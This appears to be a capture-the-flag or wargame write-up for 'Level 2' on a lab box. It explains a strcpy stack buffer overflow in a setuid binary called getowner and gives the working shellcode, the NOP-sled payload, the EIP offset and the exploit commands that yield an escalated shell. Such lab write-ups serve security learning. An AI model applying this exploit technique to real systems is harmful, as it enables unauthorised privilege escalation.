# Level 2

## Details
**Vulnerability:** Buffer overflow

**Memory Security:** None

**Description**

This challenge was a basic buffer overflow. The attack vector for this challenge, is through an environment variable called "filename". The getowner binary reads this information and performs a strcpy, allowing me to smash the stack and gain control of EIP. The payload, which includes a nopsled and shellcode, was stored in an additional environment variable and the address of this environment variables was discovered using the getenvaddr tool.


The first thing I did was smash the stack and enumerate how many bytes it took to overwrite EIP. I used peda's pattern and pattern_search tools in GDB to do this. However, I could have easily done it with Metasploit's pattern_create.rb or similar methods.

Bytes to overwrite EIP: 151(buffer) + 4(ret) = 155

At this point, I created a payload, which consists of a nopsled and my shellcode, and put it in an environment variable called SHELL. I use the getenvaddr tool to find out the memory address, which points to the beginning of my payload.

I then use this address when overriting EIP to execute my shellcode.

## Exploit
Setting up the payload:
```bash
level2@blackbox:~$ export SHELL=`python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
```

Getting the SHELL environment variable location:
```bash
level2@blackbox:/tmp/hpl2$ ./getenvaddr SHELL ~/getowner
SHELL will be at 0xbfffdb0c
```

Setting up the buffer overflow and exploitation: 
```bash
level2@blackbox:/tmp/hpl2$ export filename=`python -c 'import struct; print "A" * 151 + struct.pack("<L", 0xbfffdb0c)'`

level2@blackbox:/tmp/hpl2$ ~/getowner 
The owner of this file is: 0
bash-3.1$ id
uid=1003(level2) gid=1005(gamers) euid=1004(level3) groups=1003(level2),1005(gamers)
```


